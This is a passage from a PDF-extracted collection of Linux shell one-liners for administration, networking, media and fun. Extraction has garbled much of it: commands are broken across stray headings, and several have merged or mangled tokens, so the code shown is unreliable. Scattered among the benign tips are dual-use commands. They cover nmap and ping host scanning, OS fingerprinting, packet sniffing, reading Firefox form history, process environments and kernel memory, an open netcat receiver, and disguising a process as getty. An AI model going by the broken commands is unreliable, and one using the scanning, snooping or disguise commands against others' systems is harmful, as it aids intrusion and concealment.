```
### Single use vnc-over-ssh connection
``` linux
$ ssh -f -L 5900:localhost:5900 your. ssh.server "x11vnc -safer -localhost -nopw -
```
### once -display :0"; vinagre localhost:5900
```
### Diff remote webpages using wget
``` linux
$ diff <(wget -q -O - URL1) <(wget -q -O - URL2)
```
### List alive hosts in specific subnet
``` linux
$ nmap -sP 192.168.1.0/24
```
### Processes per user counter
``` linux
$ ps hax -o user | sort | uniq -c
```
### View all date formats, Quick Reference Help Alias
``` linux
$ alias dateh=' date --help|sed -n "/^ *%%/,/^ *%Z/p"|while read l;do F=${l/% */};
```
### date+%$F:"|'"'"'${F//%n/ }'"'"'|${l#* }";done|sed "s/\ *|\ */|/g" |column -s "|" -t'
```
### Your terminal sings
``` linux
$ echo {1..199}" bottles of beer on the wall, cold bottle of beer, take one down,
```
### pass it around, one less bottle of beer on the wall,, " | espeak -v english -s 140
```
### Make sure a script is run in a terminal.
``` linux
$ [ -t 0 ] || exit 1
```
### Matrix Style
``` linux
$ echo -e "\e[32m"; while :; do for i in {1..16}; do r="$(($RANDOM % 2))"; if [[ $
```
### (($RANDOM % 5)) == 1 ]]; then if [[ $(($RANDOM % 4)) == 1 ]]; then v+="\e[1m $r
```
### "; else v+="\e[2m $r "; fi; else v+=" "; fi; done; echo -e "$v"; v=""; done
```
### 39 | P a g e
```
### TechCircleQuickly (soft-)reboot skipping hardware checks
``` linux
$ /sbin/kexec -l /boot/$KERNEL --append="$KERNELPARAMTERS"
```
### --initrd=/boot/$INITRD; sync; /sbin/kexec -e
```
### Pipe output of a command to your clipboard
``` linux
$ some command|xsel --clipboard
```
### Ls -hog --> a more compact ls -l
``` linux
$ ls -hog
```
### Git remove files which have been deleted
``` linux
$ git rm $( git ls-files --deleted)
```
### Efficiently print a line deep in a huge log file
``` linux
$ sed '1000000!d;q' < massive-log-file.log
```
### Silently ensures that a FS is mounted on the given mount point
```
### (checks if it's OK, otherwise unmount, create dir and mount)
``` linux
$ ( mountpoint -q "/media/mpdr1" && df/media/mpdr1/* > /dev/null 2>&1) || (( sudo
```
### u mount "/media/mpdr1" > /dev/null 2>&1 || true) && ( sudo mkdir "/media/mpdr1"
```
### > /dev/null 2>&1 || true) && sudo mount "/dev/sdd1" "/media/mpdr1")
```
### Sniff network traffic on a given interface and displays the IP
```
### addresses of the machines communicating with the current host
```
### (one IP per line)
``` linux
$ sudo tcpdump -i wlan0 -n ip | awk '{ printgensub(/(.*)\..*/,"\\1","g",$3), $4,
```
### gensub(/(.*)\..*/,"\\1","g",$5) }' | awk -F " > " '{ print $1"
```
### "$2}'
```
### Check if system is 32bit or 64bit
``` linux
$ getconf LONG_BIT
```
### Create a local compressed tarball from remote host directory
``` linux
$ ssh user@host "tar -zcf - /path/to/dir" > dir.tar.gz
```
### Rapidly invoke an editor to write a long, complex, or tricky
```
### command
``` linux
$ <ESC> v or ctrl-x ctrl-e
```
### Send a circular
``` linux
$ wall <<< "Broadcast This"
```
### The BOFH Excuse Server
``` linux
$ telnet towel.blinkenlights.nl 666
```
### 40 | P a g e
```
### TechCircleI finally found out how to use notify-send with at or cron
``` linux
$ echo " export DISPLAY=:0; exportXAUTHORITY=~/.Xauthority; notify-send test" |
```
### at now+1minute
```
### See udev at work
``` linux
$ udevadm monitor
```
### Bash: hotkey to put current commandline to text-editor
``` linux
$ bash-hotkey: <CTRL+x+e>
```
### Show current working directory of a process
``` linux
$ pwdx pid
```
### Base conversions with bc
``` linux
$ echo "obase=2; 27" | bc -l
```
### Put readline into vi mode
``` linux
$ set -o vi
```
### Transfer SSH public key to another machine in one step
``` linux
$ ssh-keygen; ssh-copy-id user@host; sshuser@host
```
### Start a command on only one CPU core
``` linux
$ taskset -c 0 your_command
```
### Convert uppercase files to lowercase files
``` linux
$ rename 'y/A-Z/a-z/' *
```
### List of commands you use most often
``` linux
$ history | awk '{print $2}' | sort | uniq -c | sort -rn | head
```
### Notepad in a browser (type this in the URL bar)
``` linux
$ data:text/html, <html contenteditable>
```
### Display current time in requested time zones.
``` linux
$ zdump Japan America/New_York
```
### Dmesg with colored human-readable dates
``` linux
$ dmesg -T|sed -e 's|\(^.*'`date +%Y`']\)\(.*\)|\x1b[0;34m\1\x1b[0m - \2|g'
```
### Stamp a text line on top of the pdf pages.
``` linux
$ echo "This text gets stamped on the top of the pdf pages." | enscript -B -f Courier-
```
### Bold16 -o- |ps2pdf - | pdftk input.pdf stamp - output output.pdf
```
### 41 | P a g e
```
### TechCirclePrint diagram of user/groups
``` linux
$ awk 'BEGIN{FS=":"; print "digraph{"}{split($4, a, ","); for (i in a) printf "\"%s\"
```
### [shape=box]
```
### \"%s\" -> \"%s\"
```
### ", $1, a[i], $1}END{ print "}"}' /etc/group|display
```
### Create a file server, listening in port 7000
``` linux
$ while true; do nc -l 7000 | tar -xvf -; done
```
### Bypass any aliases and functions for the command
``` linux
$ \foo
```
### Share your terminal session real-time
``` linux
$ mkfifo foo; script -f foo
```
### Df without line wrap on long FS name
``` linux
$ df -P | column -t
```
### Stderr in color
``` linux
$ mycommand 2> >(while read line; do echo -e "\e[01;31m$line\e[0m"; done)
```
### VI config to save files with +x when a shebang is found on line 1
``` linux
$ au BufWritePost * if getline(1) =~ "^#!" | if getline(1) =~ "/bin/" | silent !chmod
```
### +x <afile> | endif | endif
```
### Create a single PDF from multiple images with ImageMagick
``` linux
$ convert *.jpg output.pdf
```
### Dd with progress bar and statistics
``` linux
$ sudo dd if=/dev/sdc bs=4096 | pv -s 2G | sudo dd bs=4096
```
### of=~/USB_BLACK_BACKUP.IMG
```
### Delete all empty lines from a file with vim
``` linux
$ :g/^$/d
```
### Perl one-liner to get the current week number
``` linux
$ date +%V
```
### Backup all MySQL Databases to individual files
``` linux
$ for db in $(mysql -e 'show databases' -s --skip-column-names); do mysqldump $db
```
### | gzip > "/backups/mysqldump-$(hostname)-$db-$(date +%Y-%m-%d-%H.%M.
```
### %S).gz"; done
```
### Ultimate current directory usage command
``` linux
$ ncdu
```
### 42 | P a g e
```
### TechCircleTerminal - Show directories in the PATH, one per line with sed and
```
### bash3.X `here string'
``` linux
$ tr : '
```
### ' <<<$PATH
```
### Have an ssh session open forever
``` linux
$ autossh -M50000 -t server.example.com 'screen -raAd mysession'
```
### Recursively compare two directories and output their differences on
```
### a readable format
``` linux
$ diff -urp /originaldirectory /modifieddirectory
```
### DELETE all those duplicate files but one based on md5 hash
```
### comparision in the current directory tree
``` linux
$ find . -type f -print0|xargs -0 md5sum|sort|perl -ne 'chomp;$ph=$h;($h,$f)=split(/\
```
### s+/,$_,2);print "$f"."\x00" if ($h eq $ph)'|xargs -0 rm -v --
```
### Find broken symlinks and delete them
``` linux
$ find -L /path/to/check -type l -delete
```
### List recorded formular fields of Firefox
``` linux
$ cd ~/.mozilla/firefox/ && sqlite3 `cat profiles.ini |grep Path | awk -F= '{print
```
### $2}'`/formhistory.sqlite "select * from moz_formhistory" && cd - > /dev/null
```
### Using awk to sum/count a column of numbers.
``` linux
$ cat count.txt | awk '{ sum+=$1} END {print sum}'
```
### Get all the keyboard shortcuts in screen
``` linux
$ ^A ?
```
### Get list of servers with a specific port open
``` linux
$ nmap -sT -p 80 -oG - 192.168.1.* | grep open
```
### Return external ip
``` linux
$ curl ipinfo.io
```
### Simple multi-user encrypted chat server for 5 users
``` linux
$ ncat -vlm 5 --ssl --chat 9876
```
### Check if your ISP is intercepting DNS queries
``` linux
$ dig +short which.opendns.com txt @208.67.220.220
```
### Remove a range of lines from a file
``` linux
$ sed -i <file> -re '<start>,<end>d'
```
### 43 | P a g e
```
### TechCircleExtract audio from Flash video (*.flv) as mp3 file
``` linux
$ ffmpeg -i video.flv -vn -ar 44100 -ac 2 -ab 192k -f mp3 audio.mp3
```
### Cat a bunch of small files with file indication
``` linux
$ grep . *
```
### Stop Flash from tracking everything you do.
``` linux
$ for i in ~/.adobe ~/.macromedia ; do ( rm $i/ -rf ;ln -s /dev/null $i ) ; done
```
### List all open ports and their owning executables
``` linux
$ lsof -i -P | grep -i "listen"
```
### Purge configuration files of removed packages on debian based
```
### systems
``` linux
$ aptitude purge '~c'
```
### Monitor open connections for httpd including listen, count and sort
```
### it per IP
``` linux
$ watch "netstat -plan|grep :80|awk {'print \$5'} |cut -d: -f 1 | sort | uniq -c | sort -nk
```
### 1"
```
### Convert text to picture
``` linux
$ echo -e "Some Text Line1
```
### Some Text Line 2" | convert -background none -density 196 -resample 72 -unsharp
```
### 0x.5 -font "Courier" text:- -trim +repage -bordercolor white -border 3 text.gif
```
### Remote screenshot
``` linux
$ DISPLAY=":0.0" import -window root screenshot.png
```
### Define words and phrases with google.
``` linux
$ define(){ local y="$@";curl -sA"Opera" "http://www.google.com/search?q=define:
```
### ${y// /+}"|grep -Po '(?<=<li>)[^<]+'|nl|perl -MHTML::Entities -pe
```
### 'decode_entities($_)' 2>/dev/null;}
```
### List all authors of a particular git project
``` linux
$ git log --format='%aN' | sort -u
```
### Track flights from the command line
``` linux
$ flight_status() { if [[ $# -eq 3 ]];then offset=$3; else offset=0; fi;
```
### curl"http://mobile.flightview.com/TrackByRoute.aspx?
```
### view=detail&al="$1"&fn="$2"&dpdat=$(date +%Y%m%d -d ${offset}day)"
```
### 2>/dev/null |html2text |grep ":"; }
```
### Harder, Faster, Stronger SSH clients
``` linux
$ ssh -4 -C -c blowfish-cbc
```
### 44 | P a g e
```
### TechCircleClean up poorly named TV shows.
``` linux
$ rename -v 's/.*[s,S](\d{2}).*[e,E](\d{2}).*\.avi/SHOWNAME\ S$1E$2.avi/'
```
### poorly.named.file.s01e01.avi
```
### Pretty Print a simple csv in the command line
``` linux
$ column -s, -t <tmp.csv
```
### Cleanup firefox's database.
``` linux
$ find ~/.mozilla/firefox/ -type f -name "*.sqlite" -exec sqlite3 {} VACUUM \;
```
### Check open ports
``` linux
$ lsof -Pni4 | grep LISTEN
```
### Find Duplicate Files (based on MD5 hash)
``` linux
$ find -type f -exec md5sum '{}' ';' | sort | uniq --all-repeated=separate -w 33 | cut -
```
### c 35-
```
### Triple monitoring in screen
``` linux
$ tmpfile=$(mktemp) && echo -e 'startup_message off
```
### screen -t top h top
```
### split
```
### focus
```
### screen -t nethogs nethogs wlan0
```
### split
```
### focus
```
### screen -t io top io top' > $tmpfile && sudo screen -c $tmpfile
```
### Smiley Face Bash Prompt
``` linux
$ PS1="\`if [ \$? = 0 ]; then echo \e[33\;40m\\\^\\\_\\\^\e[0m; else echo \
```
### e[36\;40m\\\-\e[0m\\\_\e[36\;40m\\\-\e[0m; fi\` \u \w:\h)"
```
### Save an HTML page, and covert it to a .pdf file
``` linux
$ wget $URL | htmldoc --webpage -f "$URL".pdf - ; xpdf "$URL".pdf &
```
### Create an emergency swapfile when the existing swap space is
```
### getting tight
``` linux
$ sudo dd if=/dev/zero of=/swapfile bs=1024 count=1024000; sudo mkswap
```
### /swapfile; sudoswapon /swapfile
```
### Relocate a file or directory, but keep it accessible on the old
```
### location throug a simlink.
``` linux
$ mv $1 $2 && ln -s $2/$(basename $1) $(dirname $1)
```
### A short counter
``` linux
$ yes '' | cat -n
```
### 45 | P a g e
```
### TechCircleRsync remote data as root using sudo
``` linux
$ rsync -- rsync-path 'sudo rsync' username@source:/folder/ /local/
```
### Convert all MySQL tables and fields to UTF8
``` linux
$ mysql --database=dbname -B -N -e "SHOW TABLES" | awk '{print "ALTER TABLE",
```
### $1, "CONVERT TO CHARACTER SET utf8 COLLATE utf8_general_ci;"}' | mysql --
```
### database=dbname &
```
### Pipe STDOUT to vim
``` linux
$ tail -1000 /some/file | vim -
```
### Copy stdin to your X11 buffer
``` linux
$ ssh user@host cat /path/to/some/file | xclip
```
### Get info about remote host ports and OS detection
``` linux
$ nmap -sS -P0 -sV -O <target>
```
### Copy a file structure without files
``` linux
$ find * -type d -exec mkdir /where/you/wantem/\{\} \;
```
### Start a new command in a new screen window
``` linux
$ alias s='screen -X screen'; s top; s vi; s man ls;
```
### Convert from hexidecimal or octal to decimal
``` linux
$ echo $((0x1fe)) $((033))
```
### Save man-page as pdf
``` linux
$ man -t awk | ps2pdf - awk.pdf
```
### Convert seconds into minutes and seconds
``` linux
$ echo 'obase=60;299' | bc
```
### List files accessed by a command
``` linux
$ strace -ff -e trace=file my_command 2>&1 |perl -ne 's/^[^"]+"(([^\\"]|\\
```
### [\\"nt])*)".*/$1/ && print'
```
### Short and elegant way to backup a single file before you change it.
``` linux
$ cp httpd.conf{,.bk}
```
### Find all the links to a file
``` linux
$ find -L / -samefile /path/to/file -exec ls -ld {} +
```
### 46 | P a g e
```
### TechCircleRecover tmp flash videos (deleted immediately by the browser
```
### plugin)
``` linux
$ for h in `find /proc/*/fd -i lname "/tmp/Flash*" 2>/dev/null`; do ln -s "$h" `readlink
```
### "$h" | cut -d' ' -f1`; done
```
### Rsync instead of scp
``` linux
$ rsync --progress --partial --rsh="ssh -p 8322" --bwlimit=100 --ipv4
```
### user@domain.com:~/file.tgz .
```
### Send a circular
``` linux
$ echo "dear admin, please ban eribsskog" | wall
```
### Visit wikileaks.com
``` linux
$ echo 213.251.145.96 wikileaks.com >>/etc/hosts
```
### Make sudo forget password instantly
``` linux
$ sudo -K
```
### Print a row of characters across the terminal
``` linux
$ printf "%`tput cols`s"|tr ' ' '#'
```
### Download and unpack tarball without leaving it sitting on your hard
```
### drive
``` linux
$ wget -qO - http://example.com/path/to/blah. tar.gz | tar xzf -
```
### Colored diff ( via vim ) on 2 remotes files on your local computer.
``` linux
$ vimdiff scp://root@server-foo.com//etc/snmp/snmpd.conf scp://root@server-
```
### bar.com//etc/snmp/snmpd.conf
```
### Split a tarball into multiple parts
``` linux
$ tar cf - <dir>|split -b<max_size>M - <name>. tar.
```
### Remove executable bit from all files in the current directory
```
### recursively, excluding other directories
``` linux
$ chmod -R -x+X *
```
### More precise BASH debugging
``` linux
$ env PS4=' ${BASH_SOURCE}:${LINENO}(${FUNCNAME[0]}) ' sh -x /etc/profile
```
### Get all pdf and zips from a website using wget
``` linux
$ wget --reject html,htm --accept pdf,zip -rl1 url
```
### 47 | P a g e
```
### TechCircleMount the first NTFS partition inside a VDI file (VirtualBox Disk
```
### Image)
``` linux
$ mount -t ntfs-3g -o
```
### ro,loop,uid=user,gid=group,umask=0007,fmask=0117,offset=0x$(hd -n 1000000
```
### image.vdi | grep"eb 52 90 4e 54 46 53" | cut -c 1-8) image.vdi /mnt/vdi-ntfs
```
### Show me a histogram of the busiest minutes in a log file:
``` linux
$ cat /var/log/secure.log | awk '{print substr($0,0,12)}' | uniq -c | sort -nr | awk
```
### '{printf("
```
### %s ",$0) ; for (i = 0; i<$1 ; i++) {printf("*")};}'
```
### Print a great grey scale demo !
``` linux
$ yes "$(seq 232 255;seq 254 -1 233)" | while read i; do printf "\x1b[48;5;${i}m
```
### "; sleep .01; done
```
### Create a list of binary numbers
``` linux
$ echo {0..1}{0..1}{0..1}{0..1}
```
### Create a system overview dashboard on F12 key
``` linux
$ bind '"\e[24~"':"\"ps -elF;df -h;free -mt;netstat -lnpt;who -a\C-m"""
```
### Coloured tail
``` linux
$ tail -f FILE | perl -pe 's/KEYWORD/\e[1;31;43m$&\e[0m/g'
```
### Disable history for current shell session
``` linux
$ unset HISTFILE
```
### Search for commands from the command line
``` linux
$ clfu-seach <search words>
```
### How to run X without any graphics hardware
``` linux
$ startx -- `which Xvfb` :1 -screen 0 800x600x24 && DISPLAY=:1 x11vnc
```
### Install a Firefox add-on/theme to all users
``` linux
$ sudo firefox -install-global-extension /path/to/add-on
```
### Clear current line
``` linux
$ CTRL+u
```
### Quickly generate an MD5 hash for a text string using OpenSSL
``` linux
$ echo -n 'text to be encrypted' | openssl md5
```
### Terminate a frozen SSH-session
``` linux
$ RETURN~.
```
### 48 | P a g e
```
### TechCircleBackup a remote database to your local filesystem
``` linux
$ ssh user@host 'mysqldump dbname | gzip' > /path/to/backups/db-backup-`date +
```
### %Y-%m-%d`.sql.gz
```
### Generat a Random MAC address
``` linux
$ MAC=`(date; cat /proc/interrupts) | md5sum |sed -r 's/^(.{10}).*$/\1/; s/([0-9a-f]
```
### {2})/\1:/g; s/:$//;'`
```
### Batch convert files to utf-8
``` linux
$ find . -name "*.php" -exec iconv -f ISO-8859-1 -t UTF-8 {} -o ../newdir_utf8/{} \;
```
### Get http headers for an url
``` linux
$ curl -I www.commandlinefu.com
```
### Random git-commit message
``` linux
$ git commit -m "$(curl -s http://whatthecommit.com/index.txt)";
```
### Generate QR code for a WiFi hotspot
``` linux
$ qrencode -s 7 -o qr-wifi.png "WIFI:S:$(zenity --entry --text="Network name (SSID)"
```
### --title="Create WiFi QR");T:WPA;P:$(zenity --password --title="Wifi Password");;"
```
### Check if system is 32bit or 64bit
``` linux
$ arch
```
### Vi a remote file
``` linux
$ vi scp://username@host//path/to/somefile
```
### Show permissions of current directory and all directories upwards to
```
### /
``` linux
$ namei -m $(pwd)
```
### Move you up one directory quickly
``` linux
$ shopt -s autocd
```
### Hide the name of a process listed in the `ps` output
``` linux
$ exec -a "/sbin/getty 38400 tty7" your_cmd -erase_all_files
```
### Remove a line from a file using sed (useful for updating known SSH
```
### server keys when they change)
``` linux
$ ssh-keygen -R <thehost>
```
### Show what PID is listening on port 80 on Linux
``` linux
$ fuser -v 80/tcp
```
### 49 | P a g e
```
### TechCircleList by size all of the directories in a given tree.
``` linux
$ du -h /path | sort -h
```
### Find the most recently changed files (recursively)
``` linux
$ find . -type f -printf '%TY-%Tm-%Td %TT %p
```
### ' | sort
```
### All IP connected to my host
``` linux
$ netstat -lantp | grep ESTABLISHED | awk'{print $5}' | awk -F: '{print $1}' | sort -u
```
### Figure out what shell you're running
``` linux
$ echo $0
```
### Download a file and uncompress it while it downloads
``` linux
$ wget http://URL/FILE. tar.gz -O - | tar xfz -
```
### Rename all .jpeg and .JPG files to have .jpg extension
``` linux
$ rename 's/\.jpe?g$/.jpg/i' *
```
### Remove Thumbs.db files from folders
``` linux
$ find ./ -name Thumbs.db -delete
```
### List open files that have no links to them on the filesystem
``` linux
$ lsof +L1
```
### Display BIOS Information
``` linux
$ # dd if=/dev/mem bs=1k skip=768 count=256 2>/dev/null | strings -n 8
```
### Open path with your default program (on Linux/*BSD)
``` linux
$ xdg-open [path]
```
### Copy an element from the previous command
``` linux
$ !:1-3
```
### View user activity per directory.
``` linux
$ sudo lsof -u someuser -a +D /etc
```
### Use the previous commands params in the current command
``` linux
$ !!:[position]
```
### Mirror a directory structure from websites with an Apache-
```
### generated file indexes
``` linux
$ lftp -e "mirror -c" http://example.com/foobar/
```
### 50 | P a g e
```
### TechCircleQuickly share code or text from vim to others.
``` linux
$ :w !curl -F "sprunge=<-" http://sprunge.us | xclip
```
### Copy from host1 to host2, through your host
``` linux
$ ssh root@host1 "cd /somedir/tocopy/ && tar -cf - ." | ssh root@host2 "cd
```
### /samedir/tocopyto/ && tar -xf -"
```
### Convert all Flac in a directory to Mp3 using maximum quality
```
### variable bitrate
``` linux
$ for file in *.flac; do flac -cd "$ file" | lame -q 0 --vbr-new -V 0 - "${ file
```
### %.flac}.mp3"; done
```
### Limit bandwidth usage by apt-get
``` linux
$ sudo apt-get -o Acquire::http::Dl-Limit=30 upgrade
```
### Tune your guitar from the command line.
``` linux
$ for n in E2 A2 D3 G3 B3 E4;do play -n synth 4 pluck $n repeat 2;done
```
### Grep -v with multiple patterns.
``` linux
$ grep 'test' somefile | grep -vE '(error|critical|warning)'
```
### Redirect stdout and stderr each to separate files and print both to
```
### the screen
``` linux
$ (some_command 2>&1 1>&3 | tee /path/to/errorlog ) 3>&1 1>&2 | tee
```
### /path/to/stdoutlog
```
### Identify long lines in a file
``` linux
$ awk 'length>72' file
```
### Use all the cores or CPUs when compiling
``` linux
$ make -j 4
```
### Prints total line count contribution per user for an SVN repository
``` linux
$ svn ls -R | egrep -v -e "\/$" | xargs svn blame |awk '{print $2}' | sort | uniq -c | sort
```
### -r
```
### Analyze awk fields
``` linux
$ awk '{print NR": "$0; for(i=1;i<=NF;++i)print "\t"i": "$i}'
```
### Colored SVN diff
``` linux
$ svn diff <file> | vim -R -
```
### Run a command, store the output in a pastebin on the internet and
```
### place the URL on the xclipboard
``` linux
$ ls | curl -F 'sprunge=<-' http://sprunge.us | xclip
```
### 51 | P a g e
```
### TechCircleShow git branches by date - useful for showing active branches
``` linux
$ for k in `git branch|perl -pe s/^..//`;do echo -e `git show --
```
### pretty=format:"%Cgreen%ci %Cblue%cr%Creset" $k|head -n 1`\\t$k;done|sort -r
```
### Find if the command has an alias
``` linux
$ type -all command
```
### Find last reboot time
``` linux
$ who -b
```
### Show a config file without comments
``` linux
$ egrep -v "^$|^[[:space:]]*#" /etc/some/file
```
### Start screen in detached mode
``` linux
$ screen -d -m [<command>]
```
### Iso-8859-1 to utf-8 safe recursive rename
``` linux
$ detox -r -s utf_8 /path/to/old/win/files/dir
```
### Create dir tree
``` linux
$ mkdir -p doc/{text/,img/{wallpaper/,photos/}}
```
### Run any GUI program remotely
``` linux
$ ssh -fX <user>@<host> <program>
```
### Delete all empty lines from a file with vim
``` linux
$ :g!/\S/d
```
### List the files any process is using
``` linux
$ lsof +p xxxx
```
### Show biggest files/directories, biggest first with 'k,m,g' eyecandy
``` linux
$ du --max-depth=1 | sort -r -n | awk '{split("k m g",v); s=1;
```
### while($1>1024){$1/=1024; s++} printint($1)" "v[s]"\t"$2}'
```
### Change directory to actual path instead of symlink path
``` linux
$ cd `pwd -P`
```
### Download an entire static website to your local machine
``` linux
$ wget --recursive --page-requisites --convert-links www.moyagraphix.co.za
```
### Recursively remove .svn directories from the current location
``` linux
$ find . -type d -name '.svn' -print0 | xargs -0 rm -rdf
```
### 52 | P a g e
```
### TechCircleCount files beneath current directory (including subfolders)
``` linux
$ find . -type f | wc -l
```
### Read and write to TCP or UDP sockets with common bash tools
``` linux
$ exec 5<>/dev/tcp/time.nist.gov/13; cat <&5 & cat >&5; exec 5>&-
```
### Use top to monitor only all processes with the same name fragment
```
### 'foo'
``` linux
$ top -p $(pgrep -d , foo)
```
### Delete command line last word
``` linux
$ ctrl+w
```
### Draw kernel module dependancy graph.
``` linux
$ lsmod | awk 'BEGIN{ print "digraph{"}{split($4, a, ","); for (i in a) print $1, "->",
```
### a[i]}END{ print"}"}'|display
```
### Color man pages
``` linux
$ echo "export LESS_TERMCAP_mb=$'\E[01;31m'" >> ~/.bashrc
```
### Print without executing the last command that starts with...
``` linux
$ !ssh:p
```
### What is the use of this switch ?
``` linux
$ manswitch () { man $1 | less -p "^ +$2"; }
```
### Save the list of all available commands in your box to a file
``` linux
$ compgen -c | sort -u > commands
```
### Protect directory from an overzealous rm -rf *
``` linux
$ cd <directory>; touch ./-i
```
### Watch RX/TX rate of an interface in kb/s
``` linux
$ while [ /bin/ true ]; do OLD=$NEW; NEW=`cat /proc/net/dev | grep eth0 | tr -s ' ' |
```
### cut -d' ' -f "3 11"`; echo $NEW $OLD | awk '{printf("\rin: % 9.2g\t\tout: % 9.2g", ($1-
```
### $3)/1024, ($2-$4)/1024)}'; sleep 1; done
```
### List 10 largest directories in current directory
``` linux
$ du -hs */ | sort -hr | head
```
### Reuse last parameter
``` linux
$ !$
```
### 53 | P a g e
```
### TechCircleBlink LED Port of NIC Card
``` linux
$ ethtool -p eth0
```
### Pretend to be busy in office to enjoy a cup of coffee
``` linux
$ j=0;while true; do let j=$j+1; for i in $(seq 0 20 100); do echo $i;sleep 1; done |
```
### dialog --gauge "Install part $j : `sed $(perl -e "print int rand(99999)")"q;d"
```
### /usr/share/dict/words`" 6 40;done
```
### See where a shortened url takes you before click
``` linux
$ check(){ curl -sI $1 | sed -n 's/Location: *//p';}
```
### Stream YouTube URL directly to MPlayer
``` linux
$ yt () mplayer -fs -quiet $(youtube-dl -g "$1")
```
### Generate a Random MAC address
``` linux
$ openssl rand -hex 6 | sed 's/\(..\)/\1:/g; s/.$//'
```
### Running scripts after a reboot for non-root users .
``` linux
$ @reboot <yourscript.sh>
```
### Run command on a group of nodes in parallel
``` linux
$ echo "uptime" | pee "ssh host1" "ssh host2" "ssh host3"
```
### Make, or run a script, everytime a file in a directory is modified
``` linux
$ while true; do inotifywait -r -e MODIFY dir/ && make; done;
```
### Choose from a nice graphical menu which DI.FM radio station to play
``` linux
$ zenity --list --width 500 --height 500 --column 'radio' --column 'url' --print-column 2
```
### $(curl -s http://www.di.fm/ | awk -F '"' '/href="http:.*\.pls.*96k/ {print $2}' | sort |
```
### awk -F '/|\.' '{print $(NF-1) " " $0}') | xargs mplayer
```
### Check the status of 'dd' in progress (OS X)
``` linux
$ killall -INFO dd
```
### Ping scanning without nmap
``` linux
$ for i in {1..254}; do ping -c 1 -W 1 10.1.1.$i |grep 'from'; done
```
### Convert a Nero Image File to ISO
``` linux
$ dd bs=1k if=image.nrg of=image.iso skip=300
```
### View network activity of any application or user in realtime
``` linux
$ lsof -r 2 -p PID -i -a
```
### Copy with progress
``` linux
$ rsync --progress file1 file2
```
### 54 | P a g e
```
### TechCirclePrint a list of standard error codes and descriptions.
``` linux
$ perl -le 'print $!+0, "\t", $!++ for 0..127'
```
### Recursive search and replace old with new string, inside files
``` linux
$ find . -type f -exec sed -i s/oldstring/newstring/g {} +
```
### Generate random password
``` linux
$ pwgen -Bs 10 1
```
### A function to output a man page as a pdf file
``` linux
$ function man2pdf(){ man -t ${1:?Specify manas arg} | ps2pdf -
```
### dCompatibility=1.3 - - > ${1}.pdf; }
```
### Unbelievable Shell Colors, Shading, Backgrounds, Effects for Non-X
``` linux
$ for c in `seq 0 255`;do t=5;[[ $c -lt 108 ]]&&t=0;for i in `seq $t 5`;do echo -e "\
```
### e[0;48;$i;${c}m|| $i:$c `seq -s+0 $(($COLUMNS/2))|tr -d '[0-9]'`\e[0m";done;done
```
### Show directories in the PATH, one per line
``` linux
$ echo $PATH | tr \: \
```
### Move all images in a directory into a directory hierarchy based on
```
### year, month and day based on exif information
``` linux
$ exiftool '-Directory<DateTimeOriginal' -d %Y/%m/%d dir
```
### Follow tail by name (fix for rolling logs with tail -f)
``` linux
$ tail -F file
```
### Convert "man page" to text file
``` linux
$ man ls | col -b > ~/Desktop/ man_ ls.txt
```
### Get your public ip using dyndns
``` linux
$ curl -s http://checkip.dyndns.org/ | grep -o "[[:digit:].]\+"
```
### Display current bandwidth statistics
``` linux
$ ifstat -nt
```
### Given process ID print its environment variables
``` linux
$ sed 's/\o0/
```
### /g' /proc/INSERT_PID_HERE/environ
```
### Restoring some data from a corrupted text file
``` linux
$ ( cat badfile.log ; tac badfile.log | tac ) > goodfile.log
```
### View the system console remotely
``` linux
$ sudo cat /dev/vcs1 | fold -w 80
```
### 55 | P a g e
```
### TechCircleLook up the definition of a word
``` linux
$ curl dict://dict.org/d:something
```
### Diff files on two remote hosts.
``` linux
$ diff <(ssh alice cat /etc/apt/sources.list) <(ssh bob cat /etc/apt/sources.list)
```
### Ctrl+S Ctrl+Q terminal output lock and unlock
``` linux
$ Ctrl+S Ctrl+Q
```
### Redirect STDIN
``` linux
$ < /path/to/file.txt grep foo
```
### I hate `echo X | Y`
``` linux
$ base64 -d <<<
```
### aHR0cDovL3d3dy50d2l0dGVyc2hlZXAuY29tL3Jlc3VsdHMucGhwP3U9Y29tbWFuZGxp
```
### bmVmdQo=
```
### Send keypresses to an X application
``` linux
$ xvkbd -xsendevent -text "Hello world"
```
### Add calendar to desktop wallpaper
``` linux
$ convert -font -misc-fixed-*-*-*-*-*-*-*-*-*-*-*-* -fill black -draw "text 270,260 \"
```
### `cal` \"" testpic.jpg newtestpic.jpg
```
### Browse system RAM in a human readable form
``` linux
$ sudo cat /proc/kcore | strings | awk 'length > 20' | less
```
### Backup your hard drive with dd
``` linux
$ sudo dd if=/dev/sda of=/media/disk/backup/sda.backup
```
### Calculates the date 2 weeks ago from Saturday the specified format.
``` linux
$ date -d '2 weeks ago Saturday' +%Y-%m-%d
```
### Get Cisco network information
``` linux
$ tcpdump -nn -v -i eth0 -s 1500 -c 1 'ether[20:2] == 0x2000'
```
### Press ctrl+r in a bash shell and type a few letters of a previous
```
### command
``` linux
$ ^r in bash begins a reverse-search-history with command completion
```
### Extract audio from a video
``` linux
$ ffmpeg -i video.avi -f mp3 audio.mp3
```
### 56 | P a g e
```
### TechCircleQuick glance at who's been using your system recently
``` linux
$ last | grep -v "^$" | awk '{ print $1 }' | sort -nr |uniq -c
```
### Ping a range of IP addresses
``` linux
$ nmap -sP 192.168.1.100-254
```
### Use last argument of last command
``` linux
$ file !$
```
### Show which programs are listening on TCP and UDP ports
``` linux
$ netstat -plunt
```
### Determine if a port is open with bash
``` linux
$ : </dev/tcp/127.0.0.1/80
```
### Search for a process by name
``` linux
$ ps -fC PROCESSNAME
```
### Download all mp3's listed in an html page
``` linux
$ wget -r -l1 -H -t1 -nd -N -np -A.mp3 -erobots=off [url of website]
```
### Run the built in PHP-server in current folder
``` linux
$ php -S 127.0.0.1:8080
```
### Press enter and take a WebCam picture.
``` linux
$ read && ffmpeg -y -r 1 -t 3 -f video4linux2 -vframes 1 -s sxga -i /dev/video0
```
### ~/webcam-$(date +%m_%d_%Y_%H_%M).jpeg
```
### Commandline document conversion with Libreoffice
``` linux
$ soffice --headless -convert-to odt:"writer8" somefile.docx
```
### HourGlass
``` linux
$ hourglass(){ trap 'tput cnorm' 0 1 2 15 RETURN;local s=$(($SECONDS +$1));(tput
```
### civis;while (($SECONDS<$s));do for f in '|' '\' '-' '/';do echo -n "$f";sleep .2s; echo -n
```
### $'\b';done;done;);}
```
### Gets the english pronunciation of a phrase
``` linux
$ say() { mplayer "http://translate.google.com/translate_tts?q=$1"; }
```
### Check syntax for all PHP files in the current directory and all
```
### subdirectories
``` linux
$ find . -name \*.php -exec php -l "{}" \;
```
